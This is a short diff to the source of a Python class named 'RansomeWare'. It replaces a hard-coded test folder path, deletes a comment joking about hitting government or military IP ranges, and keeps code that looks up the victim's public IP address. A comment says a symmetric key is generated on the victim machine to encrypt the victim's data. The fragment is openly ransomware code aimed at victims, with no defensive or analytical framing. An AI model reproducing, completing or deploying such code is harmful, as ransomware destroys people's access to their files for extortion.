@@ -44,9 +44,9 @@ class RansomeWare:
         #self.sysRoot = os.path.expanduser('~')
 
         # use localRoot to test encryption software and for absolute path for files and encryption of "test system"
-        self.localRoot = r'D:/OS/Programs/Python/random/Ransomware/test' # Debugging/Testing 
+        self.localRoot = r'<test folder>' # Debugging/Testing 
 
-        # get public IP of a person/system for more analysis etc. (check if we hit gov, military ip space LOL)
+
         self.publicIP = requests.get('https://api.ipify.org').text
 
     # Generates [symmetric key] on victim machine which is used to encrypt victims data .. 
